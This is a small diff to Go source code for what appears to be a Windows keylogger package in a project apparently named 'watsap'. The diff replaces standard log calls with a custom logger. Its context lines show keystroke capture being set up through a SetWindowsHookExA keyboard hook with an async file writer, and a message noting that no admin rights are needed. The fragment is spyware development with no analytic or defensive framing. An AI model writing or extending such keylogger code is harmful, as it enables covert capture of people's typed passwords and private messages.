@@ -5,12 +5,12 @@ package keylog
 
 import (
 	"fmt"
-	"log"
 	"os"
 	"syscall"
 	"time"
 	"unsafe"
 	"watsap/utils/config"
+	"watsap/utils/logger"
 )
 
 // --- Windows API Definitions ---
@@ -94,7 +94,7 @@ func flushBuffer(buf *string) {
 func InitKeyboard() {
 	go logWorker() // Start async file writer
 
-	log.Println("[Keylog] Starting Hook (No Admin Required for User Apps)...")
+	logger.Info("Keylog", "Starting Hook (No Admin Required for User Apps)...")
 
 	// 1. Set the Hook
 	hook, _, err := procSetWindowsHookExA.Call(
@@ -105,7 +105,7 @@ func InitKeyboard() {
 	)
 
 	if hook == 0 {
-		log.Printf("[Keylog] Failed to set hook: %v", err)
+		logger.Error("Keylog", "Failed to set hook: %v", err)
 		return
 	}
 	keyboardHook = HHOOK(hook)
